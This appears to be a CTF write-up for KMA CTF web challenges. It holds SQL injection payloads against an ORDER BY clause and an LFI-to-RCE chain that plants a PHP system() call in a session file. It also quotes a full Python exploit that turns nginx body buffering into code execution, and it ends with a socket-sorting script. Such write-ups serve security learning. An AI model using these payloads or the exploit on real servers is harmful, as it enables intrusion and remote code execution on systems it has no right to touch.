# KMACTF đợt 1

## KMA CTF - Try SQL Map

**hints**: The length of flag table name > 32 characters

### PHÂN TÍCH
Như tên bài , thì đây là bài SQLi ở lệnh ORDER BY: `http://try-sqlmap.ctf.actvn.edu.vn/?order=id`

Câu truy vấn có thể sẽ như sau:

```
SELECT column_name from table_name order by $_GET[order]
```

`Quick sqlmap` --> sql injection `error based`!

**Payload**:
```
updatexml(0,concat(0xa,(select table_name from information_schema.tables limit 1)),0)
```
**Result**:
```
XPATH syntax error: '
flahga123456789xxsxx012xxxxxxxx'
```

Because of the length, we use mid function in MySQL to cut the rest of flag that are not fully obtain.

```
updatexml(0,concat(0xa,(select mid(table_name,20,25) from information_schema.tables limit 1)),0)
```
**Result**:
```
XPATH syntax error: '
x012xxxxxxxxx34567xx1'
```

Ok, merge it together: `flahga123456789xxsxx012xxxxxxxxx34567xx1`, we got the table name.

Same with column and flag using column_name from information_schema.tables --> select column_name from flahga123456789xxsxx012xxxxxxxxx34567xx1....

**flag**: `KMACTF{X_Ooooooooooooorder_By_Noooooooooooooooooooone_SQLMaaaaaaaaaaaap?!!!!!!!!!!!!}`

## KMA CTF 2022 - RCE Me

**hint**: I am using php-fpm alpine docker

**Vulnerable to LFI**: `http://rce-me.ctf.actvn.edu.vn/?l=/etc/passwd`
```
root:x:0:0:root:/root:/bin/ash bin:x:1:1:bin:/bin:/sbin/nologin daemon:x:2:2:daemon:/sbin:/sbin/nologin adm:x:3:4:adm:/var/adm:/sbin/nologin lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin sync:x:5:0:sync:/sbin:/bin/sync shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown halt:x:7:0:halt:/sbin:/sbin/halt mail:x:8:12:mail:/var/mail:/sbin/nologin news:x:9:13:news:/usr/lib/news:/sbin/nologin uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin ....
User,,,:/home/www-data:/sbin/nologin utmp:x:100:406:utmp:/home/utmp:/bin/false
```

Let's try to read source code using `php wrapper`: `http://rce-me.ctf.actvn.edu.vn/?l=php://filter/convert.base64-encode/resource=index.php`
```php
<?php
session_start();
$_SESSION['name'] = @$_GET["name"];
$l = @$_GET['l'];
if ($l) include $l;
?>
<h1>Try rce me!</h1>
<h2>
  <a href="?l=/etc/passwd">?l=/etc/passwd</a>
</h2>
```

The idea very is very clear, if we can read php session file, we can using `name parameter` to inject PHP code to session file to get RCE:

**PHP session file location**:
```
First check the value of `session.save_path` using `ini_get('session.save_path')` or `phpinfo()`. If that is non-empty, then it will show where the session files are saved. In many scenarios `it is empty by default`, in which case read on:

  On `Ubuntu or Debian` machines, if `session.save_path is not set`, then session files are saved in `/var/lib/php5`.
  On `RHEL and CentOS` systems, if `session.save_path is not set`, session files will be saved in `/var/lib/php/session`
  I think that if you `compile PHP from source`, then when `session.save_path is not set`, session files will be saved in `/tmp`.
```

And yes, your php session file location is: 
```
/tmp/sess_[YOUR-PHP-SESSION-ID]
```

**Try**: `http://rce-me.ctf.actvn.edu.vn/?l=/tmp/sess_sd8vma27g1tuo0e6e1v7e18jj1`
```html
name|N;
```

`http://rce-me.ctf.actvn.edu.vn/?l=/tmp/sess_sd8vma27g1tuo0e6e1v7e18jj1&name=<?php system('id'); ?>`
```html
name|s:22:"uid=82(www-data) gid=82(www-data) groups=82(www-data),82(www-data) ";
```

Do some simple rce, we found file contain the flag: `flag_KMACTF_hihi_do_anh_bat_duoc_em.txt`

**flag**: `KMACTF{Do_anh_session_duoc_em_hihi}` 

## KMA CTF - RCE Me 2

**hints**: https://bierbaumer.net/security/php-lfi-with-nginx-assistance/https://bierbaumer.net/security/php-lfi-with-nginx-assistance/

**PHP LFI with Nginx Assistance**:
This post presents a new method to exploit local file inclusion (LFI) vulnerabilities in utmost generality, assuming only that `PHP is running in combination with Nginx` under a common `standard configuration`. The technique was discovered while developing the includer's revenge / counter challenges from the hxp CTF 2021.
.......
Luckily PHP is currently often deployed via `PHP-FPM and Nginx`. Nginx offers an `easily-overlooked client body buffering` feature which will `write temporary files` if the client body (not limited to post) is `bigger than a certain threshold`.

This feature `allows LFIs to be exploited without any other way of creating files`, if `Nginx runs as the same user as PHP` (very commonly done as www-data).

```python
Full Exploit:
#!/usr/bin/env python3
import sys, threading, requests

# exploit PHP local file inclusion (LFI) via nginx's client body buffering assistance
# see https://bierbaumer.net/security/php-lfi-with-nginx-assistance/ for details

URL = f'http://{sys.argv[1]}:{sys.argv[2]}/'

# find nginx worker processes 
r  = requests.get(URL, params={
    'file': '/proc/cpuinfo'
})
cpus = r.text.count('processor')

r  = requests.get(URL, params={
    'file': '/proc/sys/kernel/pid_max'
})
pid_max = int(r.text)
print(f'[*] cpus: {cpus}; pid_max: {pid_max}')

nginx_workers = []
for pid in range(pid_max):
    r  = requests.get(URL, params={
        'file': f'/proc/{pid}/cmdline'
    })

    if b'nginx: worker process' in r.content:
        print(f'[*] nginx worker found: {pid}')

        nginx_workers.append(pid)
        if len(nginx_workers) >= cpus:
            break

done = False

# upload a big client body to force nginx to create a /var/lib/nginx/body/$X
def uploader():
    print('[+] starting uploader')
    while not done:
        requests.get(URL, data='<?php system($_GET["c"]); /*' + 16*1024*'A')

for _ in range(16):
    t = threading.Thread(target=uploader)
    t.start()

# brute force nginx's fds to include body files via procfs
# use ../../ to bypass include's readlink / stat problems with resolving fds to `/var/lib/nginx/body/0000001150 (deleted)`
def bruter(pid):
    global done

    while not done:
        print(f'[+] brute loop restarted: {pid}')
        for fd in range(4, 32):
            f = f'/proc/self/fd/{pid}/../../../{pid}/fd/{fd}'
            r  = requests.get(URL, params={
                'file': f,
                'c': f'id'
            })
            if r.text:
                print(f'[!] {f}: {r.text}')
                done = True
                exit()

for pid in nginx_workers:
    a = threading.Thread(target=bruter, args=(pid, ))
    a.start()
```

We just have to edit a little of those code to fit with this challenge: 

  file -> l
  
  pid_max = 4194304
  
  edit break loop condition where `r.text` always return True(save r.text at the beginning and use it to compare to every loop)
  
## Programming
`fast_n_furious.py`:
```python
from pwn import *

hostname = '103.28.172.12'
port = 1111

def prepare(result):
	raw = ((result.decode())[1:])[:-1].split(' ')
	sortable = [int(i) for i in raw]
	level_sorted = sorted(sortable)
	level = '['
	for i in level_sorted:
	    level += str(i) + ' '
	level = level[:-1] + ']'

	return level.encode()

s = remote(hostname, port)

level2 = prepare((s.recvlines(8))[7])
s.sendline(level2)

try:
	while 1:
		level = prepare((s.recvlines(3))[2])
		s.sendline(level)
except:
	print(s.recvlines(1))

```
**Done, here is your flag**: `KMACTF{F4st_n_Fur10us_BigInt}`
